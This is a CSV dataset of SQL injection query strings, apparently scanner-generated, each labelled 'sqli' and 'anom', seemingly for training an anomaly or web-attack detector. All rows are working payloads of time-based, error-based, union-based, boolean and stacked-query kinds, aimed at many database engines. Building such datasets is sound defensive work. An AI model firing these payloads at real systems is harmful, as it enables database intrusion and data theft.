Query,Length,Attack,Label
"1"";iif(5257=5257,1,1/0)",23,sqli,anom
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',59,sqli,anom
"-5109))) or make_set(6627=7331,7331) and (((9466=9466",53,sqli,anom
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589",176,sqli,anom
"-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#",69,sqli,anom
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv",222,sqli,anom
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'",77,sqli,anom
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,89,sqli,anom
1%' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=',73,sqli,anom
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",216,sqli,anom
"-2086%'))) or make_set(9354=9354,7185) and ((('%'='",51,sqli,anom
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
"-5700 where 4238=4238 union all select 4238,4238,4238#",54,sqli,anom
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('vjhw' like 'vjhw",130,sqli,anom
1')) and 3526=1354,18,sqli,anom
"1"") where 3445=3445 and elt(1212=1254,1254)--",45,sqli,anom
"1%')) union all select null,null,null,null,null,null,null,null,null,null--",74,sqli,anom
"1' in boolean mode) and elt(3114=3114,sleep(5))#",48,sqli,anom
1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,69,sqli,anom
"-1504"") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",99,sqli,anom
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",72,sqli,anom
"1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--",91,sqli,anom
1'+(select mavu where 4276=4276 rlike sleep(5)#,47,sqli,anom
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",48,sqli,anom
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",50,sqli,anom
"-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",75,sqli,anom
1'))) and 4069=8786 and ((('eftr'='eftr,39,sqli,anom
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo",54,sqli,anom
"1) as fgqe where 1526=1526 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,sqli,anom
"1%"";if(8995=9787) select 8995 else drop function ofgg--",55,sqli,anom
"-1174"" union all select 4303,4303,4303,4303#",44,sqli,anom
"-5424')) union all select 8231,8231,8231,8231,8231,8231,8231,8231#",66,sqli,anom
"1 where 5081=5081 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",123,sqli,anom
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",121,sqli,anom
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')# twev,101,sqli,anom
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",122,sqli,anom
"1%"";begin dbms_lock.sleep(5); end and ""%""=""",43,sqli,anom
"1%"") union all select null,null--",33,sqli,anom
"1' in boolean mode) and elt(9630=4765,4765)#",44,sqli,anom
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--",77,sqli,anom
"1'||(select 'hbho' from dual where 7193=7193;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",147,sqli,anom
"1""))) and elt(2421=9612,9612) and (((""gbdx"" like ""gbdx",54,sqli,anom
"-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--",80,sqli,anom
"1)) as debc where 7428=7428 union all select null,null,null#",60,sqli,anom
"1'+(select 'plcm' where 2141=2141 and elt(3114=3114,sleep(5))#",62,sqli,anom
"1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",79,sqli,anom
1' or 6793=(select 6793 from pg_sleep(5)) and 'dogx'='dogx,58,sqli,anom
"1"" or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",97,sqli,anom
"1%"");iif(5257=5257,1,1/0)",25,sqli,anom
"1 and elt(4249=4249,7259)# lwyo",31,sqli,anom
1) where 7680=7680 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,223,sqli,anom
"1%"") or (select * from (select(sleep(5)))sddo)#",47,sqli,anom
"1' and elt(3114=3114,sleep(5))#",31,sqli,anom
"-9227) where 6723=6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",91,sqli,anom
1 and 9198=9198--,17,sqli,anom
"1"") where 6897=6897;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli,anom
"-6334') union all select 3738,3738,3738,3738,3738,3738,3738,3738--",66,sqli,anom
1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,103,sqli,anom
"1' in boolean mode) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))#",123,sqli,anom
-2992')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('tjgt'='tjgt,213,sqli,anom
"-3853"") where 4626=4626 union all select 4626,4626,4626--",57,sqli,anom
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,sqli,anom
-5089')) as icbb where 1129=1129 or 6250=9650,45,sqli,anom
"1'+(select inyd where 1668=1668 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'",123,sqli,anom
1'));select (case when (5418=6516) then 1 else 5418*(select 5418 from master..sysdatabases) end)--,98,sqli,anom
"-5744) union all select 3617,3617,3617,3617,3617,3617--",55,sqli,anom
"1') where 5883=5883 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli,anom
"1' in boolean mode) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",128,sqli,anom
1')) as joco where 2922=2922;select sleep(5)--,46,sqli,anom
"1"")) as irrz where 8730=8730 order by 1#",40,sqli,anom
-2452'))) union all select 1951--,33,sqli,anom
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('tkcy' like 'tkcy",129,sqli,anom
"1%')) union all select null,null,null,null,null--",49,sqli,anom
"1) where 2940=2940;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,sqli,anom
1') as xiqw where 8507=8507 rlike sleep(5)--,44,sqli,anom
1'||(select 'vwmg' where 7928=7928;select (case when (8233=1074) then 8233 else 1/(select 0) end)--,99,sqli,anom
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('wfws'='wfws",192,sqli,anom
1')));begin dbms_lock.sleep(5); end--,37,sqli,anom
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",55,sqli,anom
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",142,sqli,anom
1'))) and sleep(5) and ((('hwjy'='hwjy,38,sqli,anom
"-8894%"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",219,sqli,anom
"1"")) as fjtv where 8904=8904;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",116,sqli,anom
"1');select count(*) from generate_series(1,5000000)",51,sqli,anom
"1"") as qwyt where 4236=4236 union all select null,null,null,null,null--",71,sqli,anom
"1' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
1)));waitfor delay '0:0:5' and (((8981=8981,43,sqli,anom
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('edcm' like 'edcm",176,sqli,anom
1'||(select 'zzkx' where 3270=3270 and 2006=2006,48,sqli,anom
"1"")) as drss where 2077=2077 and 7533=7533--",44,sqli,anom
"1%"")) and elt(7633=4110,4110) and ((""%""=""",41,sqli,anom
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",52,sqli,anom
"1%'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",147,sqli,anom
"1"")) as esho where 8864=8864 order by 1--",41,sqli,anom
"1"") where 4172=4172 or (select * from (select(sleep(5)))sddo)#",62,sqli,anom
-5134))) or 8571=8571--,23,sqli,anom
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--",77,sqli,anom
"1'||(select 'zvpl' where 5877=5877 union all select null,null#",62,sqli,anom
(8362=9139)*9139,16,sqli,anom
"1"")));if(7899=7899) select 7899 else drop function zbbp--",57,sqli,anom
"-8353'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('ptlz'='ptlz",224,sqli,anom
"-4427')) union all select 6357,6357,6357,6357,6357#",51,sqli,anom
"-7737'||(select 'xalo' where 9219=9219 union all select 9219,9219,9219,9219#",76,sqli,anom
"1'))) and make_set(8403=8403,8899) and ((('zxon' like 'zxon",59,sqli,anom
"1%"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli,anom
"1 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",109,sqli,anom
"1) as ghew where 6441=6441 union all select null,null--",55,sqli,anom
1%')) and 7160=7249--,21,sqli,anom
"-3316%"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",203,sqli,anom
"1%') and elt(1210=1210,sleep(5)) and ('%'='",43,sqli,anom
"-6442""))) or 3038=3038",22,sqli,anom
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""jyad""=""jyad",116,sqli,anom
"1) or elt(6272=6272,sleep(5))",29,sqli,anom
1');(select * from (select(sleep(5)))acdk)#,43,sqli,anom
"1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",130,sqli,anom
"1%'))) and 2388=benchmark(5000000,md5(0x6d457153))#",51,sqli,anom
1))) and 7533=7533 and (((7740=7740,35,sqli,anom
1' or (select * from (select(sleep(5)))ydpu),44,sqli,anom
-8878' in boolean mode) union all select 7785#,46,sqli,anom
"1'||(select 'skds' from dual where 8594=8594 and make_set(6779=2027,2027))||'",77,sqli,anom
"1') where 1625=1625 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",122,sqli,anom
1' rlike (select * from (select(sleep(5)))vwyq)#,48,sqli,anom
"-7416"" where 7656=7656 order by 1--",35,sqli,anom
"1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",111,sqli,anom
1%');select (case when (5740=7636) then 5740 else cast(1 as int)/(select 0 from dual) end) from dual--,102,sqli,anom
"-7423 or make_set(9354=9354,7185)-- hprc",40,sqli,anom
"1"")) waitfor delay '0:0:5'--",28,sqli,anom
"1%') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,sqli,anom
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",95,sqli,anom
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",76,sqli,anom
"-2365)) union all select 8190,8190#",35,sqli,anom
"1"") and elt(6651=1172,1172) and (""zfkb"" like ""zfkb",50,sqli,anom
"1',(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",84,sqli,anom
1')) and 2006=2006,18,sqli,anom
"1')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null--",63,sqli,anom
1' in boolean mode) and (select * from (select(sleep(5)))fzno)#,63,sqli,anom
-7636') or 5898=8880 and ('sjuv'='sjuv,38,sqli,anom
"1%""))) or sleep(5)#",19,sqli,anom
1 where 8095=8095;select (case when (5152=7853) then 5152 else 5152*(select 5152 from mysql.db) end)#,101,sqli,anom
1%' rlike sleep(5) and '%'=',28,sqli,anom
"-5243"" where 2105=2105 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",255,sqli,anom
"1"") where 6964=6964;select count(*) from generate_series(1,5000000)--",69,sqli,anom
"1"")));begin user_lock.sleep(5); end--",37,sqli,anom
1') and sleep(5) and ('orxt'='orxt,34,sqli,anom
1'));select pg_sleep(5) and (('vxxg'='vxxg,42,sqli,anom
1)) as tnhy where 1874=1874 and 2858=7324#,42,sqli,anom
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('rqbf'='rqbf",129,sqli,anom
"-5891) where 5792=5792 union all select 5792,5792,5792,5792,5792#",65,sqli,anom
"1"") where 7513=7513 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",223,sqli,anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('pbtf'='pbtf",225,sqli,anom
"1') as ekjw where 5477=5477 union all select null,null,null,null,null--",71,sqli,anom
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bzxo' like 'bzxo",83,sqli,anom
"1%"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",152,sqli,anom
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('tvar'='tvar",164,sqli,anom
"1)) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((4048=4048",125,sqli,anom
"1'+(select 'ljtl' where 1766=1766;select count(*) from generate_series(1,5000000))+'",84,sqli,anom
"1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli,anom
"1%"") and elt(3114=3114,sleep(5))#",33,sqli,anom
1 and 5934=7745,15,sqli,anom
"-8106%"") union all select 2051,2051,2051,2051,2051,2051#",56,sqli,anom
1' in boolean mode) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')#,114,sqli,anom
-1641')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('vgcb' like 'vgcb,263,sqli,anom
"-8021"") union all select 1166,1166,1166,1166--",46,sqli,anom
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""cecf""=""cecf",127,sqli,anom
"1"")) as casz where 5921=5921 rlike (select * from (select(sleep(5)))vwyq)#",74,sqli,anom
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,75,sqli,anom
"1"")) and 8635=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",95,sqli,anom
"1,row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",199,sqli,anom
"1""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",104,sqli,anom
1' in boolean mode) and 8594=(select 8594 from pg_sleep(5))--,61,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null,null,null--",73,sqli,anom
1)) as gocb where 4335=4335;select case when 8227=1229 then 1 else null end--,77,sqli,anom
1') where 7478=7478;select pg_sleep(5)--,40,sqli,anom
"-3513%"" union all select 8473,8473#",35,sqli,anom
"1)) union all select null,null,null,null,null,null,null#",56,sqli,anom
1'||(select 'hafu' where 6226=6226;(select * from (select(sleep(5)))srmq))||',77,sqli,anom
"-5825) as mflf where 3999=3999 or make_set(1492=7153,7153)--",60,sqli,anom
(8266=8266)*9900,16,sqli,anom
1'))) and 5934=2309,19,sqli,anom
"-3930%"")) order by 1#",21,sqli,anom
1'+(select plhk where 6540=6540;select (case when (8403=7151) then 8403 else cast(1 as int)/(select 0 from dual) end) from dual--,129,sqli,anom
"-1559 union all select 3985,3985,3985,3985#",43,sqli,anom
1'+(select ntym where 4750=4750;select case when 7717=7717 then 1 else null end--,81,sqli,anom
"1') where 6720=6720 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
1%') and sleep(5) and ('%'=',28,sqli,anom
1';waitfor delay '0:0:5' and 'dfzn'='dfzn,41,sqli,anom
1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,127,sqli,anom
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('onmp'='onmp",178,sqli,anom
"1) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",109,sqli,anom
"1) union all select null,null#",30,sqli,anom
1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--,64,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'nazb'='nazb",174,sqli,anom
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# kfza",112,sqli,anom
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('luoj'='luoj",125,sqli,anom
1);select pg_sleep(5) and (1044=1044,36,sqli,anom
"1%"")) union all select null,null,null,null#",43,sqli,anom
"-5819%"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""%""=""",252,sqli,anom
"1) where 6150=6150;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli,anom
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",48,sqli,anom
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",96,sqli,anom
"-7963'+(select 'kxzh' where 7039=7039 union all select 7039,7039,7039,7039,7039,7039--",86,sqli,anom
"1"") where 9359=9359 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"1' in boolean mode) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))#",80,sqli,anom
"(select count(*) from generate_series(1,5000000))",49,sqli,anom
"1"") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",202,sqli,anom
"1%"")) and 4595=4595#",20,sqli,anom
"1)) as gdcg where 2329=2329 and 8407=(select count(*) from generate_series(1,5000000))--",88,sqli,anom
"1,exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",100,sqli,anom
-5803) where 8651=8651 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,222,sqli,anom
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'obax' like 'obax",82,sqli,anom
"1)) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk",170,sqli,anom
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('eugs'='eugs",116,sqli,anom
-4906'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('pkrq'='pkrq,227,sqli,anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",173,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('qfls'='qfls",116,sqli,anom
"-2067"" or 3038=3038",19,sqli,anom
"-4945 or make_set(9354=9354,7185)",33,sqli,anom
"1')) union all select null,null,null,null,null,null,null#",57,sqli,anom
-2936) or 6872=6872,19,sqli,anom
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""uosc""=""uosc",115,sqli,anom
"1) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (4557=4557",123,sqli,anom
"1')) as atpy where 9020=9020 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
1' and (select * from (select(sleep(5)))fzno) and 'gpax'='gpax,62,sqli,anom
"-7858') union all select 1541,1541,1541,1541,1541,1541#",55,sqli,anom
1')) as vwua where 8099=8099 union all select null--,52,sqli,anom
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- cbsd",108,sqli,anom
-4484')) or 6872=6872 and (('oxuo'='oxuo,40,sqli,anom
1%') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=',196,sqli,anom
"1') where 4683=4683 and 3824=benchmark(5000000,md5(0x76555642))--",65,sqli,anom
"1));select count(*) from generate_series(1,5000000)--",53,sqli,anom
"-6214"" union all select 3323,3323#",34,sqli,anom
1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj,90,sqli,anom
"-1617%"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",197,sqli,anom
"1') where 8204=8204;select count(*) from generate_series(1,5000000)--",69,sqli,anom
"1)) as zdbj where 2300=2300 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",227,sqli,anom
"1'+(select 'pgje' where 4658=4658 union all select null,null,null,null,null,null,null,null,null,null#",101,sqli,anom
1'))) order by 1--,18,sqli,anom
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ctdx",158,sqli,anom
1') or sleep(5)#,16,sqli,anom
"1%"";select case when 5559=3483 then 1 else null end--",53,sqli,anom
"1"") as rnte where 6517=6517 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli,anom
"1')) as oldh where 9551=9551 union all select null,null,null#",61,sqli,anom
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""piya""=""piya",202,sqli,anom
"1""))) and elt(4249=4249,7259) and (((""awyk"" like ""awyk",54,sqli,anom
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""nbfe""=""nbfe",98,sqli,anom
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",200,sqli,anom
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",230,sqli,anom
"1') where 6328=6328 union all select null,null,null,null,null,null,null,null,null#",82,sqli,anom
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('obmu'='obmu",79,sqli,anom
"1"")) as yutu where 1306=1306 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",105,sqli,anom
1' in boolean mode) and (8610=2985)*2985#,41,sqli,anom
"-9142%""))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",218,sqli,anom
"-9356 or elt(1032=1032,3623)-- izgi",35,sqli,anom
"1%')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",74,sqli,anom
